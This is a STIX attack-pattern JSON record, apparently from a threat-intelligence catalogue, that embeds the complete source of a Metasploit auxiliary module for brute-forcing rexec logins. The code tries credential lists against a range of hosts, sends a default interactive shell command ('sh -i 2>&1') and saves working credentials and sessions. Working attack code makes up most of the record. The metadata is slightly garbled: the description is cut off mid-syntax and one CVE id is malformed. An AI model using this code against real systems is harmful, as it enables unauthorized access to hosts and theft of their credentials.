{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7c83d253-5cfe-45a8-9c6c-e47badf1c7f6",
    "created": "2024-08-14T16:27:21.228616Z",
    "modified": "2024-08-14T16:27:21.228623Z",
    "name": "rexec Authentication Scanner",
    "description": " This module will test an rexec service on a range of machines and report successful logins.  NOTE: This module requires access to bind to privileged ports (below 1024).  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/rservices/rexec_login.rb",
            "external_id": "rexec_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::CommandShell\n\n  def initialize\n    super(\n      'Name'        => 'rexec Authentication Scanner',\n      'Description' => %q{\n          This module will test an rexec service on a range of machines and\n        report successful logins.\n\n        NOTE: This module requires access to bind to privileged ports (below 1024).\n      },\n      'References' =>\n        [\n          [ 'CVE', '1999-0651' ],\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'Author'      => [ 'jduck' ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(512),\n        OptBool.new('ENABLE_STDERR', [ true, 'Enables connecting the stderr port', false ]),\n        OptInt.new( 'STDERR_PORT',   [ false, 'The port to listen on for stderr', nil ])\n      ])\n  end\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} - Starting rexec sweep\")\n\n    if datastore['ENABLE_STDERR']\n      # For each host, bind a privileged listening port for the target to connect\n      # back to.\n      ret = listen_on_random_port(datastore['STDERR_PORT'])\n      if not ret\n        return :abort\n      end\n      sd, stderr_port = ret\n    else\n      sd = stderr_port = nil\n    end\n\n    # The maximum time for a host is set here.\n    Timeout.timeout(300) {\n      each_user_pass { |user, pass|\n        do_login(user, pass, sd, stderr_port)\n      }\n    }\n\n    sd.close if sd\n  end\n\n\n  def do_login(user, pass, sfd, stderr_port)\n    vprint_status(\"#{target_host}:#{rport} - Attempting rexec with username:password '#{user}':'#{pass}'\")\n\n    cmd = datastore['CMD']\n    cmd ||= 'sh -i 2>&1'\n\n    # We must connect from a privileged port.\n    return :abort if not connect\n\n    sock.put(\"#{stderr_port}\\x00#{user}\\x00#{pass}\\x00#{cmd}\\x00\")\n\n    if sfd and stderr_port\n      stderr_sock = sfd.accept\n      add_socket(stderr_sock)\n    else\n      stderr_sock = nil\n    end\n\n    # NOTE: We report this here, since we are awfully convinced now that this is really\n    # an rexec service.\n    report_service(\n      :host => rhost,\n      :port => rport,\n      :proto => 'tcp',\n      :name => 'exec'\n    )\n\n    # Read the expected nul byte response.\n    buf = sock.get_once(1) || ''\n    if buf != \"\\x00\"\n      buf = sock.get_once(-1) || \"\"\n      vprint_error(\"Result: #{buf.gsub(/[[:space:]]+/, ' ')}\")\n      return :failed\n    end\n\n    # should we report a vuln here? rexec allowed w/o password?!\n    print_good(\"#{target_host}:#{rport}, rexec '#{user}' : '#{pass}'\")\n    start_rexec_session(rhost, rport, user, pass, buf, stderr_sock)\n\n    return :next_user\n\n  # For debugging only.\n  #rescue ::Exception\n  #  print_error(\"#{$!}\")\n  #return :abort\n\n  ensure\n    disconnect()\n\n  end\n\n\n  #\n  # This is only needed by rexec so it is not in the rservices mixin\n  #\n  def listen_on_random_port(specific_port = 0)\n    stderr_port = nil\n    if specific_port > 0\n      stderr_port = specific_port\n      sd = listen_on_port(stderr_port)\n    else\n      stderr_port = 1024 + rand(0x10000 - 1024)\n      512.times {\n        sd = listen_on_port(stderr_port)\n        break if sd\n        stderr_port = 1024 + rand(0x10000 - 1024)\n      }\n    end\n\n    if not sd\n      print_error(\"Unable to bind to listener port\")\n      return false\n    end\n\n    add_socket(sd)\n    print_status(\"Listening on port #{stderr_port}\")\n    [ sd, stderr_port ]\n  end\n\n\n  def listen_on_port(stderr_port)\n    vprint_status(\"Trying to listen on port #{stderr_port} ..\")\n    sd = nil\n    begin\n      sd = Rex::Socket.create_tcp_server('LocalPort' => stderr_port)\n\n    rescue Rex::BindFailed\n      # Ignore and try again\n\n    end\n\n    sd\n  end\n\n\n  def start_rexec_session(host, port, user, pass, proof, stderr_sock)\n    service_data = {\n      address: host,\n      port: port,\n      service_name: 'exec',\n      proof: proof,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      module_fullname: self.fullname,\n      origin_type: :service,\n      username: user,\n      # Save a reference to the socket so we don't GC prematurely\n      stderr_sock: stderr_sock\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_data)\n\n    if datastore['CreateSession']\n      start_session(self, \"rexec #{user}:#{pass} (#{host}:#{port})\", login_data, false, self.sock)\n      # Don't tie the life of this socket to the exploit\n      self.sockets.delete(stderr_sock)\n      self.sock = nil\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[ jduck ]",
        ""
    ]
}